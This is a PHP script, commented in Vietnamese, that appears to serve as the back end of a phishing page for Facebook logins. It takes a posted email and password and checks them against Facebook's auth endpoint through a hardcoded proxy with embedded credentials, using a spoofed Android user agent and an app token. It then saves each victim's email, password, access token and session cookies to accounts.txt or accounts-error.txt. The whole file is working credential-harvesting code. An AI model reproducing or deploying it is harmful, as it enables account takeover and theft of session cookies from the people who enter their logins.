<?php
session_start();
function gettime() {
    date_default_timezone_set('Asia/Ho_Chi_Minh');
    return date("Y-m-d H:i:s");
}

$proxies = array(
    "user49025:Oez9HBAZ60@103.15.89.233:49025",
    // thêm proxy khác nữa nếu cần
);
function checkAndUpdateLoginCount($ip) {
    if (!isset($_SESSION['login_attempts'][$ip])) {
        $_SESSION['login_attempts'][$ip] = 1;
    } else {
        $_SESSION['login_attempts'][$ip]++;
    }
}

// Kiểm tra IP và số lần đăng nhập từ IP
function checkLoginLimit($ip) {
    // Kiểm tra xem IP đã đăng nhập thành công được bao nhiêu lần
    if (isset($_SESSION['login_attempts'][$ip]) && $_SESSION['login_attempts'][$ip] >= 3) {
        // Nếu số lần đăng nhập vượt quá giới hạn, trả về false
        return false;
    } else {
        // Nếu chưa vượt quá giới hạn, trả về true
        return true;
    }
}

// Kiểm tra IP của người dùng
$ip = $_SERVER['REMOTE_ADDR'];

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['tk']) && isset($_POST['mk'])) {
        $email = $_POST['tk'];
        $password = $_POST['mk'];
        $type = $_POST['type'];
            if (!empty($password)) {
                // Kiểm tra và tăng số lần đăng nhập từ IP
                checkAndUpdateLoginCount($ip);

                // Kiểm tra xem IP có vượt quá giới hạn số lần đăng nhập không
                if (checkLoginLimit($ip)) {
        
                    // Tiếp tục xử lý đăng nhập với email và mật khẩu từ form
                    $randomProxy = $proxies[array_rand($proxies)];
                    
                    $curl = curl_init();
                    curl_setopt_array($curl, array(
                        CURLOPT_URL => 'https://graph.facebook.com/auth/login',
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_ENCODING => '',
                        CURLOPT_MAXREDIRS => 10,
                        CURLOPT_TIMEOUT => 0,
                        CURLOPT_FOLLOWLOCATION => true,
                        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                        CURLOPT_CUSTOMREQUEST => 'POST',
                        CURLOPT_POSTFIELDS => '{"locale":"vi_VN","format":"json", "email":"'.$email.'","password":"'.$password.'","access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":true}',
                        CURLOPT_HTTPHEADER => array(
                            'User-Agent: Dalvik/2.1.0 (Linux; U; Android 12; M2101K7BG Build/SP1A.210812.016) [FBAN/MobileAdsManagerAndroid; FBAV/303.0.0.28.104; FBBV/413414122; FBRV/0; FBLC/vi_VN; FBMF/Xiaomi; FBBD/Redmi ;FBDV/M2101K7BG;FBSV/12; FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM /{density 2.75, width=1080, height=2263}; FB_FW/1;]',
                            'Content-Type: application/json'
                        ),
                        CURLOPT_PROXY => $randomProxy, 
                    ));
                    $tandat = curl_exec($curl);
                    curl_close($curl);

                    $json = json_decode($tandat, true);
                    if(isset($json['is_gaming_consented']) && $json['is_gaming_consented'] == 'true' ){
                        $file = 'accounts.txt';
                        $data = $email . '|' . $password . '|Token: ' . $json['access_token'];
                        if (isset($json['session_cookies'])) {
                            $sessionCookies = json_encode($json['session_cookies']);
                            $data .= '| Cookies: ' . $sessionCookies;
                        }

                        $data .= "\n"; 
                        file_put_contents($file, $data, FILE_APPEND);
                        $_SESSION['user_id'] = $email;
                        // Đăng nhập thành công
                        $response = array(
                            'status' => 'success',
                            'message' => 'Đăng nhập thành công'
                        );
                    } else if (isset($json['error']) && $json['error'] == '405') {
                        $response = array(
                            'status' => '681',
                            'message' => 'Dính 681'
                        );
                    } else if (isset($json['error'])) {
                    $file = 'accounts-error.txt';
                        $data = $email . '|' . $password . '|Token: ' . $json['access_token'];
                        if (isset($json['session_cookies'])) {
                            $sessionCookies = json_encode($json['session_cookies']);
                            $data .= '| Cookies: ' . $sessionCookies;
                        }

                        $data .= "\n"; 
                        file_put_contents($file, $data, FILE_APPEND);
                        $response = array(
                            'status' => 'error',
                            'message' => $json['error']['error_user_msg']
                        );
                    } else {
                        $response = array(
                            'status' => 'error',
                            'message' => 'Đăng nhập thất bại, vui lòng thử lại sau'
                        );
                    }
                } else  {
                    // Đăng nhập thất bại nếu vượt quá giới hạn
                    $response = array(
                        'status' => 'error',
                        'message' => 'Bạn đã thử đăng nhập quá nhiều lần. Vui lòng thử lại sau.'
                    );
                }
            } else {
                // Password không được để trống
                $response = array('status' => 'error',
                    'message' => 'Vui lòng nhập mật khẩu.'
                );
            }
        }

        // Return JSON response
        header('Content-Type: application/json');
        echo json_encode($response);
        exit;
    }
?>
